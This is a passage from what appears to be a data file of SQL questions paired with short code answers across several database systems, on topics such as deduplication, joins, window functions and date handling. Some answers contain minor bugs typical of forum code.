    SELECT @CurrentColumnName = ColumnName FROM @SpecialValuesColumns WHERE RecordID = @Counter;
    SET @ExecSQL = 'INSERT INTO #ProtectedValues (Value) SELECT ' + @CurrentColumnName + ' FROM SpecialValues'
    EXEC (@ExecSQL)
    SET @Counter = @Counter + 1;
END

SELECT * FROM Values WHERE ValueName NOT IN (SELECT ValueName COLLATE DATABASE_DEFAULT FROM #ProtectedValues)
DROP TABLE #ProtectedValues;
"
16697,3844,Change sql Get date to format ccmmdd?,"CONVERT(VARCHAR(8),GETDATE(),12)
"
38574,39540,Postgresql - backup database and restore on different owner?,"createdb -p 5433 -T template0 db_name 
pg_restore -p 5433 --no-owner --role=owner2 -d db_name db_name.dump
"
1746,42291,comma separated field to compare in mysql,"SELECT seat
FROM sub_table AS t1
WHERE EXISTS (SELECT 1
              FROM main_table AS t2
              WHERE FIND_IN_SET(t1.seat_id, t2.seat_id) <> 0)
"
10680,813,MySQL different conditions from same column,"SELECT `serial_number`
FROM `inventoryitem`
WHERE `path` IN ('Applications/Application02.app','Applications/Application03.app')
GROUP BY `serial_number`
HAVING COUNT(case `path` when 'Applications/Application03.app' then 1 end)=1
   AND COUNT(case `path` when 'Applications/Application02.app' then 1 end)=0
"
24879,64247,How to select Multiple Rows based on one Column,"while($row = $result->fetch_array())
{
  $rows[] = $row;
}
"
38720,53636,Oracle Pattern matching,"select * 
  from someTable
 where regexp_like( someField, '=$' );
"
29778,48194,change mySQL default time from 00:00:00 to 23:59:59,"SELECT * FROM t1 WHERE date > DATE_SUB(fromdate, INTERVAL 1 SECOND) 
     AND date < DATE_ADD(todate, INTERVAL 1 DAY)
"
12611,52698,What's the most efficient way to check the presence of a row in a table?,"SELECT COUNT(1) FROM mytable WHERE id = 5
"
17279,11989,TSQL - How to URL Encode,"CREATE FUNCTION [dbo].[URLEncode] 
    (@decodedString VARCHAR(4000))
RETURNS VARCHAR(4000)
AS
BEGIN
/******
*       select dbo.URLEncode('K8%/fwO3L mEQ*.}')
**/

DECLARE @encodedString VARCHAR(4000)

IF @decodedString LIKE '%[^a-zA-Z0-9*-.!_]%' ESCAPE '!'
BEGIN
    SELECT @encodedString = REPLACE(
                                    COALESCE(@encodedString, @decodedString),
                                    SUBSTRING(@decodedString,num,1),
                                    '%' + SUBSTRING(master.dbo.fn_varbintohexstr(CONVERT(VARBINARY(1),ASCII(SUBSTRING(@decodedString,num,1)))),3,3))
    FROM dbo.numbers 
    WHERE num BETWEEN 1 AND LEN(@decodedString) AND SUBSTRING(@decodedString,num,1) like '[^a-zA-Z0-9*-.!_]' ESCAPE '!'
END
ELSE
BEGIN
    SELECT @encodedString = @decodedString 
END

RETURN @encodedString

END
GO
"
20841,57114,SQL Server : select from duplicate columns where date newest,"select t1.*
from your_table t1
inner join
(
  select sid, max(CONVERT(DATE, Invite_date)) mdate
  from your_table
  group by sid
) t2 on t1.sid = t2.sid and CONVERT(DATE, t1.Invite_date) = t2.mdate
"
26453,19253,"In T-SQL / SQL Server 2000, referencing a particular row of a result set","DECLARE @id int
DECLARE c cursor for select id from #temptable
begin
  open c
    fetch next from c into @id
    WHILE (@@FETCH_STATUS = 0)
    BEGIN
      --Do stuff here
      fetch next from c into @id
    END
  close c
  deallocate c
end
"
9546,6106,Adding extracted columns to a table - SQL,"alter table Actors add fname as (case when name like '%,%'
                                      then substring(name, charindex(',', name)+2, len(name))
                                      else name
                                 end);

alter table Actors add lname as (case when name like '%,%' then
                                      then left(name, charindex(',', name) - 1)         
                                 end);
"
713,60575,oracle 11g sql query to get data from two tables joining,"select sal_id,gal_id,actual_id,null estimate_id,amount,tax from actual where process_flag='N' 
union all
select sal_id,gal_id,null actual_id,estimate_id,amount,tax from estimate where process_flag='N' and
(sal_id,gal_id) not in (select sal_id,gal_id from actual where process_flag='N')
"
17301,10823,How to get get Unique Records based on multiple columns from a table,"SELECT primarykey, id, activity, template, creator, created FROM (
    SELECT *, row_number() OVER (partition BY id, activity, template ORDER BY created) as rn FROM table
) a 
WHERE rn = 1
"
22095,14070,Get random values from a row while two values that exist are not selected together,"with cte1 as (
    select
        be.media_id
    from battle_entries as be
    where be.btype = 1 and be.mature = 1 and be.mem_id != 1 
), cte2 as (
    select
        be1.media_id as media_id1,
        be2.media_id as media_id2
    from cte1 as be1
        inner join cte1 as be2 on be2.media_id <> be1.media_id
), cte3 as (
    select c.media_id1, c.media_id2
    from cte2 as c
    where
        not exists
        (
            select *
            from battle_votes as bv 
            where
                bv.mem_id = 1 and
                (
                    bv.win_id = c.media_id1 and bv.lst_id = c.media_id2 or
                    bv.win_id = c.media_id2 and bv.lst_id = c.media_id1
                )
        )
    order by random()
    limit 1
)
select media_id1 as media_id from cte3
union all
select media_id2 as media_id from cte3
"
21102,24089,REMAP_DATA functionality from DBMS_DATAPUMP,"DBMS_DATAPUMP.DATA_REMAP(
   handle          IN NUMBER,
   name            IN VARCHAR2,
   table_name      IN VARCHAR2,
   column          IN VARCHAR2,
   remap_function  IN VARCHAR2),
   schema          IN VARCHAR2 DEFAULT NULL);
"
34712,41806,SQL Server 2008 need to create user table type create statement with a SQL statement,"select 'create type ' + tt.name + ' as TABLE (' + 
    stuff((select ', '+c.name + ' ' + t.name +
                  case when t.name in ('varchar','char','nvarchar','nchar','binary','varbinary') 
                       then '(' + case when c.max_length = -1 
                                       then 'MAX'
                                       else convert(varchar, c.max_length)
                                  end + ')'
                       when t.name in ('numeric','decimal') 
                       then '(' + convert(varchar, c.precision) + ',' + convert(varchar, c.scale) + ')'
                       else ''
                  end 
           from sys.columns c
             inner join sys.types t
               on c.system_type_id = t.system_type_id and
                  c.user_type_id = t.user_type_id        
           where c.object_id = tt.type_table_object_id
           for xml path(''), type      
          ).value('.', 'varchar(max)'), 1, 2, '')+ ')'
from sys.table_types tt
"
3957,39146,GROUP BY doesn't distinct,"WITH CTE AS
(
   SELECT called,caller,time,duration,
      RN = ROW_NUMBER() OVER (PARTITION BY called ORDER BY time DESC)
   FROM Calls
)
SELECT called,caller,time,duration
FROM CTE WHERE RN = 1
"
11855,70202,OrientDB Time Span Search Query,"select 
    *
from 
(
    select 
        expand(hour[0-23].out()) 
    from 
       (select 
            expand(month[3].day[20-29]) 
       from 
            Year 
       where 
            year = 2015)
)
where timestamp > 1406588622
"
29411,12031,SQL Related Query,"SELECT *
FROM 
   (SELECT Name, Roll_No, Age, 'A' AS TableName
      FROM A
     UNION
    SELECT Name, Roll_No, Age, 'B'
      FROM B
     UNION
    SELECT Name, Roll_No, Age, 'C'
      FROM C) Tbl
WHERE Roll_No = [value]
"
1539,5276,Get result from 2 columns with limit and desc,"(SELECT *
 FROM VB_Names
 WHERE Buurt = 'Spangen' AND Gender = 'M'
 ORDER BY count DESC
 LIMIT 3
) UNION ALL
(SELECT *
 FROM VB_Names
 WHERE Buurt = 'Spangen' AND Gender = 'V'
 ORDER BY count DESC
 LIMIT 3
)
"
21214,71596,deleting records from sqlite on the basis of date in android,"DateFormat dateFormat = new SimpleDateFormat(""MM-dd-yyyy"");
Calendar calObj = Calendar.getInstance();
String currentDate = dateFormat.format(calObj.getTime());

String where = KEY_ATTENDANCE_SYN_STATUS + "" = ?1 AND ""
        + ""STRFTIME('%s', SUBSTR("" + KEY_ATTENDANCE_DATE_ONLY + "",7) ""
        + ""|| '-' || SUBSTR("" + KEY_ATTENDANCE_DATE_ONLY + "",1,5)) < ""
        + ""STRFTIME('%s', SUBSTR(?2,7) || '-' || SUBSTR(?2,1,5))"";
String[] whereArgs = {""C"", currentDate};
int rows = db.delete(DATABASE_TABLE_DAILY_ATTENDANCE, where, whereArgs);
"
30,1155,Need help writing a query,"select RESOURCE_ID from USER_ROLES where TEST_IND ='Y'
UNION
select RESOURCE_ID from USER_PLATFORMS where TEST_IND ='Y'
UNION
select RESOURCE_ID from USER_COMPETENCIES where TEST_IND ='Y'
UNION
select RESOURCE_ID from USER_TECH_SKILLS where TEST_IND ='Y'
UNION
select RESOURCE_ID from USER_MGR_SKILLS where TEST_IND ='Y'
UNION
select RESOURCE_ID from USER_APPS where TEST_IND ='Y'
UNION
select RESOURCE_ID from BUS_PROCS where TEST_IND ='Y'
"
17395,61423,MySQL many-to-many intersection using a single query,"SELECT
    DISTINCT(m1.ID_PERSON)
FROM
    Meetings m1, Meetings m2
WHERE
    m1.ID_EMPLOYEE=:Employee2
AND
    m2.ID_EMPLOYEE=:Employee1
AND
    m1.ID_PERSON = m2.ID_PERSON
"
3192,12929,Using the data from a for loop as a table in the From in a Select,"with example(idx, number1, number2) as (
  -- Anchor Section
  select 1
       , 1 -- initial value
       , 2 -- initial value
    from dual

  union all

  -- Recursive Section
  select prev.idx + 1
       , prev.number1 + 7
       , (prev.number2 + 8) / prev.number1
    from example prev
   where prev.idx < 100  -- The Guard
)
select * from example;
"
19511,67382,Writing a sorting query,"SELECT Job, Quantity, Status 
    FROM myTable
ORDER BY CASE 
    WHEN QUANTITY >= 400 AND STATUS = 'OK' THEN 1 
    WHEN QUANTITY >= 400 AND STATUS = 'HOLD'  THEN 2 
    WHEN QUANTITY < 400 AND STATUS = 'OK'  THEN 3 
    WHEN QUANTITY >= 400 AND STATUS = 'HOLD'  THEN 4 
    WHEN QUANTITY >= 400 AND (STATUS = '' OR STATUS IS NULL)  THEN 5 
    WHEN QUANTITY < 400 AND (STATUS = '' OR STATUS IS NULL)  THEN 6
END
"
35863,26846,SQL Multi-Table Join with SUM,"select sum(accts.balance), accts.accno, b.name
from branch b inner join bankemployee e on b.name = e.branch
inner join customer c on e.empno = c.empno
inner join (select a.accno, a.balance, max(b.custno) as custMax from account as a
inner join accountdetails as b on a.accno=b.accno
 group by a.accno,a.balance) as accts on c.custno=accts.custMax
group by accts.accno, b.name
"
1948,19919,How could I write a query to find duplicate values within grouped rows?,"SELECT *
FROM locations
GROUP BY contract_id, order_position
HAVING COUNT(*) > 1
"
6228,36951,using same where clause on multiple tables before joining them,"select
  a.account_id, a.account, t.tax, t.rate
from 
  accounts a
  inner join account_location al 
    on al.account_id = a.account_id 
    and al.location = 'A'
  left join account_tax at
    on at.account_id = a.account_id
  left join tax t on t.tax_id = at.tax_id
"
9923,34402,Retrieve top row only from the records that matches the conditions,"    select top 1 Cusip
    from Cusipprocesstime
    where status != 'In Progress' and status is not null
    order by (case when isnumeric(status) = 1 then cast(status as decimal(18,7)) end) desc;
"
8126,48644,Trying to group by foreign key to get only one row each time that's the most recent effectiveDate,"SELECT * FROM (
    SELECT  RateableValue, FreeDescriptor, saaRef, VATRate, Discount, 
            PremiseProviderId, EffectiveDate,
            TransactionDateTime, TransactionDateTimeEnd, EnteredBy,
            ROW_NUMBER() OVER (PARTITION BY PremiseProviderId ORDER BY EffectiveDate DESC) as rowNumber
    FROM      PremiseProviderVersions
    WHERE     (TransactionDateTimeEnd IS NULL)
) data
WHERE data.rowNumber = 1
"
30005,64939,Converting date in multiple formats to a new column,"date = STR_TO_DATE(TRANS_DATE ,
                   (case when len(trans_date) = 14 then '%d/%m/%y %h:%i'
                         else '%y/%m/%d %h:%i'
                    end)
                   )
"
39543,74668,"oracle select query, build columns dynamically","--Sample schema:
drop table tablex;
create table tableX(A number, B number, C number, D varchar2(10),
    constraint tableX_pk primary key (A,B,C));
insert into tableX values (1,2,3,'4');

--Query the primary key columns of a table.
select * from table(method4.dynamic_query(
    q'[
        --Query that returns a query.
        SELECT
            'select '||listagg(b.column_name,',') within group (order by column_name)||
            ' from '||a.table_name v_sql
        FROM all_constraints a, all_cons_columns b
        WHERE a.constraint_name = b.constraint_name
            AND a.table_name = 'TABLEX'
            AND a.constraint_type = 'P'
        GROUP BY a.table_name
    ]'
));

--Results:
A   B   C
-   -   -
1   2   3
"
1814,8803,How to get multiple rows united by common column in mysql in complex select with join,"Page:join('page_translations AS page_translations_en', function($join) {
    $join->on('pages.id', '=', 'page_translations_en.page_id'),
    $join->on('page_translations_en.locale', '=', 'en')
})->join('page_translations AS page_translations_he', function($join) {
    $join->on('pages.id', '=', 'page_translations_he.page_id'),
    $join->on('page_translations_he.locale', '=', 'he')
})
->select(array('pages.id AS page_id', 'page_translations_en.title as title_en', 'page_translations_he.title as 
  title_he','pages.in_menu', 'pages.created_at'))
->groupBy('page_translations.page_id');
"
38779,49690,postgresql sequence number depending on rows?,"Select row_number() over (partition by course order by since asc) as yournumber, id,
course, since from InQueue 
"
34895,29020,SQL Gap Overlap DateRanges,"select t.*,
       (select top 1 Read_Start
        from t t2
        where t2.e = t.e and t2.Read_Start > t.Read_Start
        order by t2.Read_Start
       ) as New_Read_End
from t
"
27602,22322,Trying to understand the logic of complex SQL queries in MySQL and relational algebra,"select
  dept.did as `department`,
  avg(age) as `avgAge`
from
  dept,works,emp
where
  emp.eid=works.eid and 
  dept.did=works.did
group by
  dept.did
order by
  2 desc
limit 1
"
38688,8624,"SQL query, filtering based on last value in a connected table","SELECT *
FROM USERS U
INNER JOIN
  (SELECT user_id, MAX(id) AS last_id
   FROM Calls c
   GROUP BY user_id
  ) t0
ON t0.user_id = u.id
INNER JOIN Calls c ON c.id = t0.last_id
WHERE c.type = 'stat2'
"
7947,19398,Need SQL-Regexp help: Find lowercase char before uppercase char,"select * from table where binary(your_field) regexp '^[a-z]{2,}[A-Z]+'
"
22129,51470,how to make one sql query asking for many rows,"SELECT n1.node_id FROM node_tags n1
INNER JOIN node_tags n2 ON n1.node_id = n2.node_id
INNER JOIN node_tags n3 ON n1.node_id = n3.node_id
WHERE n1.k = 'addr:housenumber' AND n1.v = '50'
AND n2.k = 'addr:street' AND n2.v = 'Kingsway'
AND n3.k = 'addr:city' AND n3.v = 'London'
"
29526,28444,"Scala Slick / ScalaQuery BigDecimal creates decimal(10,0) how to allow decimals?","def employeeMultiplier = 
  column[BigDecimal](""employeeMultiplier"", O.DBType(""decimal(10, 4)""))
"
13700,33856,How to avoid large in clause?,"declare @product(id int primary key,label nvarchar(max))
declare @period(id int primary key,date_start datetime,date_end datetime,defaultprice real)
declare @special_offer(id int,date_start datetime,date_end datetime,special_offer_price real)

insert into @product
select * 
from table_product
where label like 'gun%'

insert into @period
select * 
from table_period
where exists(
select * from @product p where p.id = table_period.FK_id_product
)

insert into @special_offer
select * 
from table_special_offer
where exists(
select * from @period p where p.id = table_special_offer.fk_id_period
)

select * from @product
select * from @period
select * from @special_offer
"
13752,64995,Merge multiple rows into single value using update Query,";WITH Table1 AS (
SELECT t.id 
      , STUFF((SELECT ',' +  name 
               FROM @Table 
               WHERE id = t.id
               FOR XML PATH(''), TYPE)
               .value('.','NVARCHAR(MAX)'),1,1,'') AS name
FROM @Table t
GROUP BY t.id)
UPDATE t2
 SET t2.name = t1.name 
FROM @Table2 t2 
INNER JOIN Table1 t1  ON t1.id=t2.id  
"
33607,40480,SQL is this possible...it probably is,"SELECT DPlaces.placeid D_PlaceID, 
       Aplaces.placeid A_PlaceID 
FROM   trips t 
       INNER JOIN places DPlaces 
               ON t.departplc = DPlaces.placename 
       INNER JOIN places APlaces 
               ON t.arrivalplc = aplaces.placename 
WHERE t.TripID = 'VALUE' 
"
13683,38847,Does row exist and multiple where,"SELECT DISTINCT m1.id 
FROM metadata m1
WHERE 
    m1.meta_key = 'school' 
AND m1.meta_value = 'Some School 1' 
AND NOT EXISTS 
(
  SELECT * FROM metadata m2
  WHERE 
      m2.meta_key = 'hidden' 
  AND m2.meta_value = '1'
  AND m2.Id = m1.Id
)
"
27974,34188,How to generate a bunch of Fake Users into MySQL Database,"CREATE PROCEDURE myfill()
BEGIN
  DECLARE v1 INT DEFAULT 1000; -- number of users to be generated ..
  DECLARE txt varchar(8);
  SET txt=v1;
  WHILE v1 > 0 DO
    insert INTO user (user_email,user_password,user_firstname,
    user_lastname,user_avatar,user_username,
    user_backgroundpicture,user_joindate) 
    VALUES (concat('mail',txt,'@domain.com'), concat('pwd',txt),
     concat('first',txt),concat('last',txt),concat('avatar',txt),
     concat('user',txt),concat('bg',txt),now() ); 
    SET v1 = v1 - 1;
    SET txt=v1;
  END WHILE;
END//
call myfill();
"
29882,13807,Count and having query,"SELECT STATE,
    District,
    SUM(CASE 
            WHEN STATUS = 0
                THEN 1
            ELSE 0
            END) Active,
    SUM(CASE 
            WHEN STATUS = 1
                THEN 1
            ELSE 0
            END) InActive
FROM (
    SELECT DISTINCT STATE,
        District,
        STATUS
    FROM tableA
    ) a
GROUP BY STATE,
    District
"
26170,6953,MySQL CONCAT returns NULL if any field contain NULL,"SELECT CONCAT(COALESCE(`affiliate_name`,''),'-',COALESCE(`model`,''),'-',COALESCE(`ip`,''),'-',COALESCE(`os_type`,''),'-',COALESCE(`os_version`,'')) AS device_name
FROM devices
"
37175,41565,MySQL - Select two columns as one based on condition,"SELECT from_stop FROM <rel_name> WHERE from_timing = 'PTP'
UNION
SELECT to_stop FROM <rel_name> WHERE to_timing = 'PTP'
"
39342,67448,Inserting value into column based on column in separate table,"update old
set NewID = new.NewID
from ContactRecords as old
  inner join NewContact as New on new.OriginalID = old.OriginalID
"
38747,73281,SQL Return Zero For Summed Column In Subquery Grouping,"select sri.ItemID, 
Requested = sum(case when sr.ApprovedDate is null then sri.Quantity else 0 end),
Approved = sum(case when sr.ApprovedDate is not null then sri.Quantity else 0 end) 
from SupplyRequestItem as sri 
inner join SupplyRequest as sr on sr.ID = sri.RequestID
group by sri.ItemID
"
21718,12011,How to sum with conditions on other columns," CREATE TEMPORARY TABLE t1 (PONumber decimal(18, 2) NOT NULL,POdate date NOT NULL,customername varchar(200) NOT NULL,description varchar(200) NOT NULL);
 INSERT INTO t1(PONumber,POdate,customername,description) 
 select distinct PONumber,POdate,customername,description from tb_po;

 select  p.PONumber,p.podate,p.customername,p.description,
(select sum(q.deliveryqty) from tb_spb q where p.PONumber=q.PONumber AND p.description = q.description) as Total
 from t1 p;

drop table t1;
"
28,19204,Delete Query to remove duplicates and keep the latest record,"delete from auro
where  rowid in
( select rwid
  from ( select rowid rwid,
                row_number() over ( partition by name
                                    order by review_id desc) rn
         from   auro
       ) t
  where  rn>1
)
"
10421,69455,SQL Server - Rows into Columns (Grouped),"select  
            it.itemname as item,
            sum(case when resi.tipo = 0 then resi.quantity else 1 end) as qty_0,
            sum(case when resi.tipo = 1 then resi.quantity else 0 end) as qty_1
from    Reserve as res inner join
            ReserveItems as resi on res.id_reserve = resi.id_reserve inner join
            Items as it on resi.defindex = it.defindex
where   res.situacao = 3
group by it.itemname
order by tipo, it.id
"
4438,65446,retrieve table and column names from code,"                Dim Connection As New MySqlConnection(Utils.connectionString) : Connection.Open()
                Dim Command As New MySqlCommand(""UPDATE custom_user_data SET `"" + name + ""`=@value WHERE userID=@userID;"", Connection)
                Command.Parameters.AddWithValue(""@value"", value)
                Command.Parameters.Add(""@userID"", MySqlDbType.Int32).Value = userID
                Command.ExecuteNonQuery()
"
34315,3092,Oracle.DataAccess.dll for .NET 4.0 in 32 bit Oracle Client install?,"C:\Users\{user}\Downloads\ODAC112040Xcopy_32bit\odp.net4\odp.net\bin\4\
"
11915,41329,SQL join: counting rows and get most recent row from another table,"SELECT ...,
 SUBSTRING_INDEX(
  GROUP_CONCAT(
    CASE
      WHEN files.type = 'floorplan'
      THEN files.id
      ELSE NULL
    END ORDER BY date_uploaded  DESC
  ) ,',',1) AS floorplans_fileid,
   SUBSTRING_INDEX(
  GROUP_CONCAT(
    CASE
      WHEN files.type = 'presentation'
      THEN files.id
      ELSE NULL
    END ORDER BY date_uploaded  DESC
  ) ,',',1) AS presentations_fileid
...
FROM ...
"
16427,10602,sql query sub select on itself confusion,"select t1.*
from myTable t1
inner join 
    (select t2.[key], min(t2.date) minDate   
    from myTable t2   
    inner join (   
      select CE.[key], CE.date     
      from myTable CE   
      where CE.indicator = 'CE'  
      ) as CEs 
    on CEs.[key] = t2.[key] 
    and CEs.date < t2.date 
    group by t2.[key]) t2s
on t2s.[key] = t1.[key]
and t1.date = t2s.minDate
order by 1, 2
"
32576,50127,Remove duplicate rows between two different columns,"SELECT e.id AS EventId, 
       rt.player_nbr AS PlayerId, 
       rt.partner_nbr AS PartnerId
FROM eventTable e INNER JOIN
     resultsTable rt
      ON e.id = rt.id
WHERE rt.player_nbr < rt.partner_nbr OR
      NOT EXISTS (SELECT 1
                  FROM resultsTable rt2 
                  WHERE rt2.id = rt.id AND
                        rt2.player_nbr = rt.partner_nbr AND
                        rt2.partner_nbr = rt.player_nbr
                  );
"
20083,73488,How to Display 1 Column sum in other Column," select inStation.name as TapInStation , outStation.name as TapOutStation, 
        count(trx.passengerCount) as PassengerCount,
        sum(trx.amount) as Fare,
        (select sum(passengerCount) from transactions iTrx) as PassengerPercent  
"
6566,38817,how can I delete duplicate records from my database,"CREATE TEMPORARY TABLE tmptbl AS SELECT DISTINCT * FROM myTabs;
DELETE FROM myTabs;
INSERT INTO myTabs SELECT * FROM tmptbl;
"
32966,7393,T-SQL - XML to SQL Server Table,"DECLARE @XML XML = '
<DTS:Executable xmlns:DTS=""www.microsoft.com/SqlServer/Dts"" DTS:refId=""P"" DTS:CreationDate=""10/01/2015 12:00:00"">
  <DTS:ConnectionManagers>
    <DTS:ConnectionManager DTS:refId=""Package.ConnectionManagers[FF]"" DTS:CreationName=""FLATFILE"" DTS:DTSID=""{123}"" DTS:ObjectName=""FF"">
      <DTS:ObjectData>
        <DTS:ConnectionManager DTS:Format=""Delimited"" DTS:LocaleID=""1033"" DTS:HeaderRowDelimiter=""_x000D__x000A_"" DTS:ColumnNamesInFirstDataRow=""True"" DTS:RowDelimiter="""" DTS:TextQualifier=""_x0022_"" DTS:CodePage=""1252"" DTS:ConnectionString=""Test.csv"">
          <DTS:FlatFileColumns>
            <DTS:FlatFileColumn DTS:ColumnType=""Delimited"" DTS:ColumnDelimiter=""_x002C_"" DTS:DataType=""11"" DTS:TextQualified=""True"" DTS:ObjectName=""TestCN"" DTS:DTSID=""{012}"" DTS:CreationName="""" />
          </DTS:FlatFileColumns>
        </DTS:ConnectionManager>
      </DTS:ObjectData>
    </DTS:ConnectionManager>
  </DTS:ConnectionManagers>
</DTS:Executable>'
;

WITH XMLNAMESPACES (N'www.microsoft.com/SqlServer/Dts' as DTS )
SELECT 
    y.vals.query('.') AS NodesAsExtracted
,   x.vals.value('@DTS:CreationName', 'Varchar(255)') AS CreationName
,   x.vals.value('@DTS:ObjectName', 'Varchar(255)') AS ObjectName
,   y.vals.value('@DTS:ConnectionString', 'Varchar(255)') AS ConnectionString
,   x.vals.value('@DTS:ColumnType', 'Varchar(255)') AS ColumnType
,   x.vals.value('@DTS:MaximumWidth', 'Varchar(255)') AS MaximumWidth
FROM @XML.nodes('/DTS:Executable/DTS:ConnectionManagers/DTS:ConnectionManager/DTS:ObjectData/DTS:ConnectionManager') AS y(vals)
    CROSS APPLY @XML.nodes('/DTS:Executable/DTS:ConnectionManagers/DTS:ConnectionManager/DTS:ObjectData/DTS:ConnectionManager/DTS:FlatFileColumns/DTS:FlatFileColumn') AS x(vals)


/*
The key piece is you are extracting data with a namespace, which makes things harder when querying.
You need to repeat certain 'nodes' so there is a syntax for that called originally enough 'nodes' that breaks up a 3d object like xml into multiple bits
I do one for the high level and one for the lower and then cross apply them which really is a whole world into itself I won't mention here
It should be represented as a parent 'x' and the values found 'vals'
I showed an example as is first when I query '('.')' which is everything in essence.
My namespace declaration must match on the xml that exists and the declaration.

more on nodes https://msdn.microsoft.com/en-us/library/ms188282.aspx
more on query https://msdn.microsoft.com/en-us/library/ms191474.aspx
more on value https://msdn.microsoft.com/en-us/library/ms178030.aspx
*/
"
3790,52995,Query plan for database table containing trillions of records,"select place
from myTable
where Designation='Manager' and
      timeOfJoining > '1930-10-10' and
      timeOfLeaving < '1950-10-10';
"
33084,50493,Combine values from one field in multi-columned Oracle 11g table,"select col1, col2, col3, col4, col5, col6,
       listagg(col7, ',') within group (order by col7) as col7s
from t1
group by col1, col2, col3, col4, col5, col6;
"
2329,47878,Update while copy records,"UPDATE source_table
   SET copy_flag = 1
OUTPUT inserted.name
  INTO destination_table(name)
 WHERE id IN 
(
  SELECT TOP 100 id 
    FROM source_table 
   ORDER BY id
)
"
2321,3194,"Should I use ""RecordID"" as a column name?","Records - TABLE  
RecordID- int - pk  
SectionID int - fk
ApplicationID - fk  
Answer1 - text  
Answer2 - text  

Sections - TABLE
SectionId int - pk
SectionSequence int
"
4247,71110,trunc date field in mysql like oracle,"SELECT *
  FROM dlbcc_purchase
  WHERE DATE(due_date) = '2014-11-20'
"
23524,24743,find records for user that are not contiguous,"DECLARE @Runners TABLE (Id INT, BeginMile INT, EndMile INT)

INSERT INTO @Runners VALUES (1,1,5)
INSERT INTO @Runners VALUES (1,5,6)
INSERT INTO @Runners VALUES (1,6,20)
INSERT INTO @Runners VALUES (1,20,25)
INSERT INTO @Runners VALUES (1,25,29)
INSERT INTO @Runners VALUES (2,1,9)
INSERT INTO @Runners VALUES (2,15,20)
INSERT INTO @Runners VALUES (3,1,2)
INSERT INTO @Runners VALUES (3,6,10)
INSERT INTO @Runners VALUES (3,10,12)

WITH OrderedUsers AS (
    SELECT  *
    ,   ROW_NUMBER() OVER (PARTITION BY Id ORDER BY BeginMile) RowNum
    FROM    @Runners
)

SELECT  a.Id [User]
,   a.BeginMile PrevBeginMile
,   a.EndMile PrevEndMile
,   b.BeginMile AfterBeginMile
,   b.EndMile AfterEndMile
,   b.BeginMile - a.EndMile Gap
FROM    OrderedUsers a
JOIN    OrderedUsers b
ON  a.Id = b.Id
AND a.EndMile <> b.BeginMile
AND a.RowNum = b.RowNum - 1
"
34083,10270,How to use Oracle ORDER BY and ROWNUM correctly?,"select *
from (select t.*, row_number() over (order by t_stamp desc) as seqnum
      from raceway_input_labo ril
     ) ril
where seqnum = 1
"
5516,6913,update the corresponding field with current date function Mysql," Update product_result as a inner join product as b on b.p_name=a.p_name set b.cost=a.cost,b.code=a.code,b.date of purchase=a.date of purchase where date of purchase <= now() and (Select max(cost)); 
"
18253,74397,SQL getting max id field on a LEFT JOIN,"SELECT messages.*, T2.photo
FROM messages
LEFT JOIN (SELECT userid, MAX(id) AS maxid
           FROM tblimages
           GROUP BY userid) AS T1
ON messages.user_id = T1.userid
LEFT JOIN tblimages AS T2
ON T2.id = T1.maxid
ORDER BY messages.msg_id DESC
"
39899,41753,SQL Server: combine two small Selects in one,"SELECT A.Email AS requesterEmail,B.Email AS approverEmail
    FROM  LogTable B
JOIN LogTable A
    ON B.NTID = R.approver AND A.NTID = R.requester
    FOR XML PATH(''), ELEMENTS, TYPE
"
30308,25634,Using DISTINCT in SQL Query,"SELECT DISTINCT 
    Suppliers.SupplierID, Customers.CompanyName, Products.ProductName,    
    Orders.OrderDate
FROM         
    Suppliers INNER JOIN
    Products ON Suppliers.SupplierID = Products.SupplierID CROSS JOIN
    Customers INNER JOIN
    Orders ON Customers.CustomerID = Orders.CustomerID
WHERE 
    Orders.OrderDate <='1/1/1999'
ORDER BY     
    Suppliers.SupplierID
"
35436,7232,SQL Server SELECT statement - how to get the info needed,"SELECT custid,
       Month(OrderDate),
       Year(OrderDate),
       Count(*) [AS number of orders]
FROM   Sales.SalesOrderHeader
GROUP  BY custid,
          Month(OrderDate),
          Year(OrderDate) 
"
8160,69585,How to check if a column data from table exist in the same table?,"SELECT date1.* FROM DATES date1 JOIN DATES date2 On date1.ID_A = date1.ID_A
WHERE date1.DATE2 = date2.DATE1
UNION
SELECT D2.* FROM DATES date1 JOIN DATES date2 On date1.ID_A = date2.ID_A
WHERE date1.DATE2 = date2.DATE1
"
36608,69772,Window running function except current row,"with
  t(i,x,y) as (
    values
      (1,1,1),(2,1,3),(3,1,2),
      (4,2,4),(5,2,2),(6,2,8)
    )
select
  t.*,
  sum(y) over w as sum,
  max(y) over w as max,
  count(*) filter (where y > 2) over w as cnt
from t
window w as (partition by x order by i
             rows between unbounded preceding and 1 preceding);
"
10818,51338,Count distinct sql and break by day with timestamp over midnight,"select dte, count(*)
from (select trip_id, min(date_trunc('day', timestamp)) as dte
      from t
      group by trip_id
     ) t
group by dte
order by dte;
"
18996,16826,"Making a generic Query, how?","ObjectQuery<dynamic> anytypeObjects = ((IObjectContextAdapter)context).ObjectContext.CreateQuery<dynamic>(queryString);
"
6324,13007,Format Column Headers during Pipe Delimited Concatenation (Oracle SQL),"PROMPT USER_NM|LAST|FIRST|PROD|EFFECTIVE_DATE

SELECT
a.USER_NAME AS USER_NM || '|'
|| a.LAST_NAME AS LAST || '|'
|| a.FIRST_NAME AS FIRST || '|'
|| b.PRODUCT_PURCHASED AS PROD || '|'
|| c.DATEPURCHASED AS EFFECTIVE_DATE
FROM ...
WHERE ...
ORDER BY ...
"
26518,70957,Looking for an alternative SQL command to find the same values in two tables,"select distinct t1.names 
from table1 t1, table2 t2
where t1.names = t2.names
"
36553,54228,sql query to count same records between two tables,"SELECT t1.sub_id, count(*) 
FROM Table1 t1 
LEFT JOIN Table2 t2 ON t1.sub_id = t2.sub_id 
GROUP BY t1.sub_id;
"
7353,8507,How can I re-write this query so I am not excluding data without tags?,"SELECT
  d.internaldocid,
  d.documentid,
  d.versionid,
  dv.title,
  string_agg(t.tagname, ',')
FROM 
  public.cmsdocument d
  JOIN public.cmsdocversion dv ON d.internaldocid = dv.internaldocid AND dv.state = 'published'
  JOIN public.cmsuser u ON d.userid = u.userid
  LEFT JOIN public.cmsobjecttag ot ON d.internaldocid = ot.objectid AND ot.objecttype = '102'
  LEFT JOIN public.cmstag t ON t.tagid = ot.tagid
GROUP BY 
  d.internaldocid,
  d.documentid,
  d.versionid,
  dv.title;
"
30563,69187,MySQL - Select specific tables from database,"select table_name 
from INFORMATION_SCHEMA.tables  
where table_schema='so_gibberish' 
and table_name in ('jiveturkey','items','casted_by') 
order by table_name;

+-------------+
| TABLE_NAME  |
+-------------+
| casted_by   |
